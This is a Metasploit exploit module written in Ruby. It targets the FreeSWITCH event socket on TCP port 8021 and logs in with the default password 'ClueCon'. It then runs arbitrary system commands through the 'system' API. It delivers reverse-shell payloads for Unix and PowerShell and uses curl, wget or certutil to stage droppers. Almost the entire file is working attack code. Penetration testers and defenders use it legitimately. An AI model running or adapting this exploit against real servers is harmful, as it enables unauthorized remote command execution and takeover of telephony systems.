# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Powershell
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;FreeSWITCH Event Socket Command Execution&#039;,
      &#039;Description&#039;     => %q{
        This module uses the FreeSWITCH event socket interface
        to execute system commands using the `system` API command.

        The event socket service is enabled by default and listens
        on TCP port 8021 on the local network interface.

        This module has been tested successfully on FreeSWITCH versions:

        1.6.10-17-726448d~44bit on FreeSWITCH-Deb8-TechPreview virtual machine;
        1.8.4~64bit on Ubuntu 19.04 (x64); and
        1.10.1~64bit on Windows 7 SP1 (EN) (x64).
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          => [&#039;bcoles&#039;],
      &#039;References&#039;      =>
        [
          [&#039;CWE&#039;, &#039;260&#039;], # default password, configurable in event_socket.conf.xml
          [&#039;URL&#039;, &#039;https://freeswitch.org/confluence/display/FREESWITCH/mod_event_socket&#039;]
        ],
      &#039;Platform&#039;        => %w[win linux unix bsd],
      &#039;Arch&#039;            => [ARCH_CMD, ARCH_X86, ARCH_X64],
      &#039;Payload&#039;         => {&#039;BadChars&#039; => "\x00\x0a\x0d\x27\x5c"},
      &#039;CmdStagerFlavor&#039; => %w[curl wget certutil vbs],
      &#039;Targets&#039;         =>
        [
          [&#039;Unix (In-Memory)&#039;,
            &#039;Platform&#039;       => &#039;unix&#039;,
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;DefaultOptions&#039; => {&#039;PAYLOAD&#039; => &#039;cmd/unix/reverse&#039;},
            &#039;Type&#039;           => :unix_memory
          ],
          [&#039;Linux (Dropper)&#039;,
            &#039;Platform&#039;       => &#039;linux&#039;,
            &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
            &#039;Type&#039;           => :linux_dropper
          ],
          [&#039;PowerShell (In-Memory)&#039;,
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
            &#039;Type&#039;           => :psh_memory
          ],
          [&#039;Windows (In-Memory)&#039;,
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;DefaultOptions&#039; => {&#039;PAYLOAD&#039; => &#039;cmd/windows/reverse_powershell&#039;},
            &#039;Type&#039;           => :win_memory
          ],
          [&#039;Windows (Dropper)&#039;,
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
            &#039;Type&#039;           => :win_dropper
          ]
        ],
      &#039;Privileged&#039;      => false,
      &#039;DefaultOptions&#039;  => { &#039;RPORT&#039; => 8021 },
      &#039;DisclosureDate&#039;  => &#039;2019-11-03&#039;,
      &#039;DefaultTarget&#039;   => 0))
    register_options [
      OptString.new(&#039;PASSWORD&#039;, [true, &#039;FreeSWITCH event socket password&#039;, &#039;ClueCon&#039;])
    ]
  end

  def check
    connect
    banner = sock.get_once.to_s
    disconnect

    if banner.include?(&#039;Access Denied, go away.&#039;) || banner.include?(&#039;text/rude-rejection&#039;)
      vprint_error &#039;Access denied by network ACL&#039;
      return CheckCode::Safe
    end

    unless banner.include?(&#039;Content-Type: auth/request&#039;)
      return CheckCode::Safe
    end

    CheckCode::Appears
  end

  def auth(password)
    sock.put "auth #{password}\n\n"
    res = sock.get_once.to_s

    unless res.include? &#039;Content-Type: command/reply&#039;
      fail_with Failure::UnexpectedReply, &#039;Unexpected reply&#039;
    end

    unless res.include?(&#039;Reply-Text: +OK accepted&#039;)
      fail_with Failure::NoAccess, &#039;Login failed&#039;
    end

    print_status &#039;Login success&#039;
  end

  def execute_command(cmd, opts = {})
    api_function = opts[:foreground] ? &#039;system&#039; : &#039;bg_system&#039;

    sock.put "api #{api_function} #{cmd}\n\n"
    res = sock.get_once.to_s

    unless res.include? &#039;Content-Type: api/response&#039;
      fail_with Failure::UnexpectedReply, &#039;Unexpected reply&#039;
    end

    vprint_status "Response: #{res}"
  end

  def exploit
    unless check == CheckCode::Appears
      fail_with Failure::NotVulnerable, &#039;Target is not vulnerable&#039;
    end

    connect
    banner = sock.get_once.to_s

    auth(datastore[&#039;PASSWORD&#039;])

    print_status "Sending payload (#{payload.encoded.length} bytes) ..."

    case target[&#039;Type&#039;]
    when :unix_memory
      if datastore[&#039;PAYLOAD&#039;] == &#039;cmd/unix/generic&#039;
        execute_command(payload.encoded, foreground: true)
      else
        execute_command(payload.encoded)
      end
    when :win_memory
      if datastore[&#039;PAYLOAD&#039;] == &#039;cmd/windows/generic&#039;
        execute_command(payload.encoded, foreground: true)
      else
        execute_command(payload.encoded)
      end
    when :psh_memory
      execute_command(
        cmd_psh_payload(
          payload.encoded,
          payload_instance.arch.first,
          { :remove_comspec => true, :encode_final_payload => true }
        )
      )
    when :linux_dropper
      execute_cmdstager(:linemax => 1_500)
    when :win_dropper
      execute_cmdstager(:linemax => 1_500)
    end
  ensure
    disconnect unless sock.nil?
  end
end

